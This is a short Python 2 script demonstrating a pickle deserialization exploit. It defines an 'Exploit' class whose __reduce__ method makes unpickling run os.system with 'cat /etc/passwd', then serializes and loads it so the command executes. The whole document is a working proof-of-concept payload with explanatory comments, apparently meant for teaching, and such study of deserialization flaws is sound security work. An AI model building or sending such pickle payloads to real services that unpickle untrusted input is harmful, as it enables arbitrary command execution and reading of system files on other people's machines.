#!/usr/bin/env python
import cPickle
import os

# This class is going to be serialized
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))


def createPayload():
    return cPickle.dumps(Exploit())

# Here we serialize a malicious Pickle object
# into a string and store it inside 'malicious'
malicious = createPayload()

# Then we deserialize it.
cPickle.loads(malicious)

# the system will execute cat /etc/passwd
